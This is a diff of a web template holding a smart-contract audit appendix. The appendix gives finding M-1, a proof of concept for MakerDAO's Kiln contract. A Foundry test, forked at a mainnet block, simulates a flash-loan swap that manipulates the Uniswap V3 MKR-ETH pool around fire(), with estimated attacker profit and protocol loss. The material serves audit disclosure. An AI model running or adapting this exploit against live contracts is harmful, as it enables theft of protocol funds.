@@ -55,117 +55,115 @@
   <content-for name="appendix">
     <section id="appendix-m1-poc" class="Copy py-16">
       <template type="audit-markdown">
-## (M-1) Proof of Concept
-
-To compute the arbitrage loss, this proof of concept
-
-1. assumes a lag of 10% between a) TWAP oracle b) spot price,
-2. it uses the Uniswap V3 MKR-ETH 0.3% pool as the trading venue, and
-3. the pool’s state on 2022/11/17 on mainnet (block number 15992230)
-
-**Findings**
-
-Using a flash loan of `235 WETH`:
-
-- **Attacker profits `0.419 WETH`, before accounting for gas or priority fee.**
-- **Slippage loss is `3.649 MKR`.**
-
-As per Maker, the initial plan is to execute `fire()` of a lot size `30,000 DAI` for 100 times for a total of 3 million DAI.
-
-Considering the worst case where the 10% lag is during each `fire()` i.e. purchase of a `lot`:
-
-- **The estimated loss for MakerDAO would be `364.9 MKR` = 3.649 MKR * 100.**
-- **The estimated gain for the attacker would be `41.9 WETH` = 0.419 WETH * 100.**
-- `**364.9 MKR` * `$660.00` (current market price of `MKR`) = `$240,834` loss for Maker.**
-- `**$240,834` / 3 million DAI = an overall loss of 8.0278%**
-
-**Proof of Concept [1]**
-
-```
-
-// forge test --use solc:0.8.14 --rpc-url=$ETH_RPC_URL --match testTWAPMispriceShortPath --fork-block-number 15992230 -vvvv
-
-// Copy into existing KilnUniV3.t.sol
-contract Attacker {}
-
-// Same as swap but paths are WETH->MKR or MKR->WETH and to arg
-
-function shortRecipSwap(address gem, uint256 amount, address to) public {
-    require(GemLike(gem).approve(kiln.uniV3Router(), amount));
-
-    bytes memory _path;
-    if (gem == WETH) {
-        _path = abi.encodePacked(WETH, uint24(3000), MKR);
-    } else {
-        _path = abi.encodePacked(MKR, uint24(3000), WETH);
-    }
-
-    ExactInputParams memory params = ExactInputParams(
-        _path,
-        to,                  // recipient
-        block.timestamp,     // deadline
-        amount,              // amountIn
-        0                    // amountOutMinimum
-    );
-
-    SwapRouterLike(kiln.uniV3Router()).exactInput(params);
-  }
-
-function testTWAPMispriceShortPath() public {
-    Attacker attacker = new Attacker(); //just an empty contract
-
-    kiln.file("lot", 30_000 * WAD); // drop to expected lot size
-    //use this as a proxy for quote returning amountOut value that is 10% lower than spot price
-    kiln.file("yen", 90 * WAD / 100);
-    kiln.file("scope", 4 hours);
-
-    mintDai(address(kiln), 30_000 * WAD);
-
-    assertEq(GemLike(DAI).balanceOf(address(kiln)), 30_000 * WAD);
-    uint256 mkrSupply = TestGem(MKR).totalSupply();
-    assertTrue(mkrSupply > 0);
-
-    uint256 _est = estimate(30_000 * WAD);
-    assertTrue(_est > 0);
-    assertEq(GemLike(MKR).balanceOf(address(attacker)), 0);
-
-    //-------Start attack executing atomically----------
-    vm.startPrank(address(attacker));
-
-    uint256 loanAmt = 235 ether; // .419 ether profit, 3.649 mkr loss
-
-    mintWeth(address(attacker), loanAmt); // funds for manipulating prices, assume this was flash loaned
-
-    // drive down MKR out amount with big WETH->MKR swap
-    shortRecipSwap(WETH, loanAmt, address(attacker)); //same as recipSwap, just with shorter paths
-
-    kiln.fire();
-
-    assertTrue(GemLike(DAI).balanceOf(address(kiln)) < 30_000 * WAD);
-    assertLt(GemLike(MKR).balanceOf(address(user)), _est);
-
-    shortRecipSwap(MKR, GemLike(MKR).balanceOf(address(attacker)), address(attacker));
-    assertGt(GemLike(WETH).balanceOf(address(attacker)), loanAmt);
-
-    //payback loan with interest
-    uint256 flashLoanFee = loanAmt * 9 / 10_000;
-    GemLike(WETH).transfer(WETH, loanAmt + flashLoanFee);
-
-    vm.stopPrank();
-    //----------End attack atomic execution-------------
-
-    console.log("Attacker profit: %s", GemLike(WETH).balanceOf(address(attacker)));
-    console.log("Kiln receiver MKR Loss: %s ", (_est - GemLike(MKR).balanceOf(address(user))));
-    console.log("Kiln receiver MKR Loss: %s WAD", (_est - GemLike(MKR).balanceOf(address(user))) / WAD);
-}
-```
-
-**Technical Notes**
-
-On assumption for `yen`
-
-1. a) `yen = 90 * WAD / 100` and b) `quote` returning value close to spot price `amountOut` is equivalent to c) `yen = WAD` and d) `quote` returning value 10% lower than spot price `amountOut`.
-1. In other words, for validation purposes, we have set `yen = 90 * WAD / 100` in this test to duplicate the behavior of a lagging quote derived from TWAP as compared to the spot price.
+          ## (M-1) Proof of Concept
+          
+          To compute the arbitrage loss, in particular the worst-case scenario, this proof of concept will:
+          
+          1. assume a lag of 10% between a) TWAP oracle b) spot price,
+          2. use the Uniswap V3 MKR-ETH 0.3% pool as the trading venue, and
+          3. use the pool’s state on 2022/11/17 on mainnet (block number 15992230); in particular, the pool’s reserve amounts.
+          
+          ### **Findings**
+          
+          Using a flash loan of `235 WETH` means:
+          
+          - **Attacker profits `0.419 WETH`, before accounting for gas or priority fee.**
+          - **Slippage loss is `3.649 MKR`.**
+          
+          As per Maker, the initial plan is to execute `fire()` of a lot size `30,000 DAI` for 100 times for a total of 3 million DAI.
+          
+          Considering the worst case, where there is a 10% price lag during each `fire()`, then:
+          
+          - **The estimated loss for MakerDAO would be `364.9 MKR` = 3.649 MKR * 100.**
+          - **The estimated gain for the attacker would be `41.9 WETH` = 0.419 WETH * 100.**
+          - `**364.9 MKR` * `$660.00` (current market price of `MKR`) = `$240,834` loss for Maker.**
+          - `**$240,834` / 3 million DAI = an overall loss of 8.0278%**
+          
+          ### **Proof of Concept [1]**
+          
+          ```
+          
+          // forge test --use solc:0.8.14 --rpc-url=$ETH_RPC_URL --match testTWAPMispriceShortPath --fork-block-number 15992230 -vvvv
+          
+          // Copy into existing KilnUniV3.t.sol
+          contract Attacker {}
+          
+          // Same as swap but paths are WETH->MKR or MKR->WETH and to arg
+          
+          function shortRecipSwap(address gem, uint256 amount, address to) public {
+              require(GemLike(gem).approve(kiln.uniV3Router(), amount));
+          
+              bytes memory _path;
+              if (gem == WETH) {
+                  _path = abi.encodePacked(WETH, uint24(3000), MKR);
+              } else {
+                  _path = abi.encodePacked(MKR, uint24(3000), WETH);
+              }
+          
+              ExactInputParams memory params = ExactInputParams(
+                  _path,
+                  to,                  // recipient
+                  block.timestamp,     // deadline
+                  amount,              // amountIn
+                  0                    // amountOutMinimum
+              );
+          
+              SwapRouterLike(kiln.uniV3Router()).exactInput(params);
+            }
+          
+          function testTWAPMispriceShortPath() public {
+              Attacker attacker = new Attacker(); //just an empty contract
+          
+              kiln.file("lot", 30_000 * WAD); // drop to expected lot size
+              //use this as a proxy for quote returning amountOut value that is 10% lower than spot price
+              kiln.file("yen", 90 * WAD / 100);
+              kiln.file("scope", 4 hours);
+          
+              mintDai(address(kiln), 30_000 * WAD);
+          
+              assertEq(GemLike(DAI).balanceOf(address(kiln)), 30_000 * WAD);
+              uint256 mkrSupply = TestGem(MKR).totalSupply();
+              assertTrue(mkrSupply > 0);
+          
+              uint256 _est = estimate(30_000 * WAD);
+              assertTrue(_est > 0);
+              assertEq(GemLike(MKR).balanceOf(address(attacker)), 0);
+          
+              //-------Start attack executing atomically----------
+              vm.startPrank(address(attacker));
+          
+              uint256 loanAmt = 235 ether; // .419 ether profit, 3.649 mkr loss
+          
+              mintWeth(address(attacker), loanAmt); // funds for manipulating prices, assume this was flash loaned
+          
+              // drive down MKR out amount with big WETH->MKR swap
+              shortRecipSwap(WETH, loanAmt, address(attacker)); //same as recipSwap, just with shorter paths
+          
+              kiln.fire();
+          
+              assertTrue(GemLike(DAI).balanceOf(address(kiln)) < 30_000 * WAD);
+              assertLt(GemLike(MKR).balanceOf(address(user)), _est);
+          
+              shortRecipSwap(MKR, GemLike(MKR).balanceOf(address(attacker)), address(attacker));
+              assertGt(GemLike(WETH).balanceOf(address(attacker)), loanAmt);
+          
+              //payback loan with interest
+              uint256 flashLoanFee = loanAmt * 9 / 10_000;
+              GemLike(WETH).transfer(WETH, loanAmt + flashLoanFee);
+          
+              vm.stopPrank();
+              //----------End attack atomic execution-------------
+          
+              console.log("Attacker profit: %s", GemLike(WETH).balanceOf(address(attacker)));
+              console.log("Kiln receiver MKR Loss: %s ", (_est - GemLike(MKR).balanceOf(address(user))));
+              console.log("Kiln receiver MKR Loss: %s WAD", (_est - GemLike(MKR).balanceOf(address(user))) / WAD);
+          }
+          
+          ```
+          
+          ### How the assumption `yen` is made
+          
+          For emulating a price lag, note that a) `yen = 90 * WAD / 100` and b) `quote` returning value close to spot-price-derived `amountOut` is equivalent to c) `yen = WAD` and d) `quote` returning a value 10% lower than spot price `amountOut`.
       </template>
     </section>
   </content-for>
